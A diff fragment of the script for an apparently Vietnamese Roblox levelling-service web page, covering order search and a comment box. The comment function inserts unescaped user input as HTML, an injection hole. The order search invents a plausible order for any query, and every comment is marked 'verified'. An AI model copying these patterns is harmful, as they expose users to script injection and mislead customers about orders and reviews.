+                pkg: servicePackage,
+                note: serviceNote,
+                time: 'Vừa xong'
+            }));
+
+            // Display success overlay
+            document.getElementById('successOverlay').classList.remove('hidden');
+        }
+
+        // Reset form state
+        function resetForm() {
+            document.getElementById('boostForm').reset();
+            document.getElementById('successOverlay').classList.add('hidden');
+        }
+
+        // Search order logic
+        function searchOrder() {
+            const query = document.getElementById('searchQuery').value.trim();
+            const resultBox = document.getElementById('searchResult');
+            const lastOrderStr = sessionStorage.getItem('lastRbxOrder');
+
+            if (!query) {
+                alert("Vui lòng nhập mã đơn hoặc tên tài khoản.");
+                return;
+            }
+
+            resultBox.classList.remove('hidden');
+
+            if (lastOrderStr) {
+                const order = JSON.parse(lastOrderStr);
+                document.getElementById('resCode').innerText = order.code;
+                document.getElementById('resGame').innerText = order.game;
+                document.getElementById('resUser').innerText = order.user;
+                document.getElementById('resPkg').innerText = order.pkg;
+                document.getElementById('resNoteContent').innerText = order.note;
+                document.getElementById('resTime').innerText = order.time;
+            } else {
+                document.getElementById('resCode').innerText = query.startsWith('#') ? query : '#RBX-' + query;
+                document.getElementById('resGame').innerText = "Blox Fruits";
+                document.getElementById('resUser').innerText = query;
+                document.getElementById('resPkg').innerText = "Gói Siêu Tốc (24H)";
+                document.getElementById('resNoteContent').innerText = "Cày Level theo yêu cầu";
+                document.getElementById('resTime').innerText = "Hôm nay";
+            }
+        }
+
+        // Add user comment logic
+        function postComment(e) {
+            e.preventDefault();
+            const name = document.getElementById('commentName').value.trim();
+            const text = document.getElementById('commentText').value.trim();
+            const container = document.getElementById('commentsContainer');
+
+            if (!name || !text) return;
+
+            const initial = name.charAt(0).toUpperCase();
+
+            const newCommentHTML = `
+                <div class="pt-3.5 space-y-1.5 animate-fade-in">
+                    <div class="flex items-center justify-between">
+                        <div class="flex items-center space-x-2">
+                            <div class="w-7 h-7 rounded-full bg-blue-600 text-white flex items-center justify-center font-bold text-xs uppercase">
+                                ${initial}
+                            </div>
+                            <div>
+                                <span class="font-bold text-xs text-slate-800">${name}</span>
+                                <span class="ml-1.5 text-[10px] font-semibold text-emerald-700 bg-emerald-50 border border-emerald-200 px-1.5 py-0.2 rounded-xs">Đã xác minh</span>
+                            </div>
+                        </div>
+                        <span class="text-[11px] text-slate-400">Vừa xong</span>
+                    </div>
+                    <p class="text-xs text-slate-600 leading-relaxed pl-9">
+                        ${text}
+                    </p>
+                </div>
+            `;
+
+            container.insertAdjacentHTML('afterbegin', newCommentHTML);
+            document.getElementById('commentText').value = '';
+            document.getElementById('commentName').value = '';
+        }
+    </script>
+</body>
+</html>
